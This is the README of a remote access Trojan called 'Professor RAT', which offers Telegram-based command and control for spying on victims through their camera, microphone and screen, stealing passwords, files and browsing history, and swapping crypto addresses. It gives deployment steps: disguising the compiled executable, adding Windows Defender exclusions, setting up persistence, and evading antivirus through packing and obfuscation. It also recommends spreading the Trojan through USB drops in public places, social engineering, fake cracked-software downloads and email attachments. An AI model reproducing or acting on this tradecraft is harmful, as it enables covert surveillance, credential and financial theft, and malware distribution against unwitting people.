# üïµÔ∏è‚Äç‚ôÇÔ∏è Professor RAT - Remote Access Toolkit

A comprehensive remote access toolkit with Telegram-based C&C (Command and Control), designed for monitoring and data exfiltration.

## üîç Overview

Professor RAT is a feature-rich remote access Trojan that provides complete surveillance and control over compromised systems. It offers real-time monitoring (camera, microphone, screen), data extraction (passwords, files, browsing history), system control (process management, remote commands), and financial tools (crypto address swapping). All commands are managed through a stealthy Telegram interface. 

The toolkit supports two deployment approaches: **Quick Deployment** using batch scripts that require admin rights for full system access and automatic AV exclusion, or **Advanced Custom Deployment** where users compile modified, packed executables that bypass AV naturally and can be disguised as legitimate programs for stealthy distribution.

## üöÄ Deployment Methods

### Method 1: Quick Deployment (Admin Required)
```
system.tmp + deploy.bat 
```

**How it works:**
- Compile `main.pyw` to `main.exe` using Nuitkita/Pyinstaller
- Rename the file to any name and extension: `ren main.exe name.extension` (*Ex: game.data, update.jar, log.cache)*
- Update the ```.bat``` file on ```line 16``` with your new file name
- Add both files to the same folder
- Run `deploy.bat` that runs as Administrator
- Batch file automatically adds `main.exe` to Windows Defender exclusions
- Creates persistence via scheduled tasks/registry
- Executes `main.exe` with full system privileges

**Perfect for:** USB drops on open vulnerable computers/laptops *(Ex: Library)* or social engineering attemps where you convince someone to run the ```.bat``` as admin.

### Method 2: Advanced Custom Deployment
```
custom_app.exe (Packed / Obfuscated)
```

**How it works:**
- Modify ```main.pyw``` to create a unique, undetectable executable
- Use packing, obfuscation, file pumping, code signing and other evasion techniques to bypass AV 
- Since your compiled executable bypasses antivirus, you can disguise it as any legitimate program
- Then deploy your payload through any method - it appears as a clean, trusted file

**Perfect for:** Fake software downloads (Ex: YouTube "cracked software" tutorials), email attachments, or any scenario where you need a clean, undetectable file that appears legitimate to the end user.
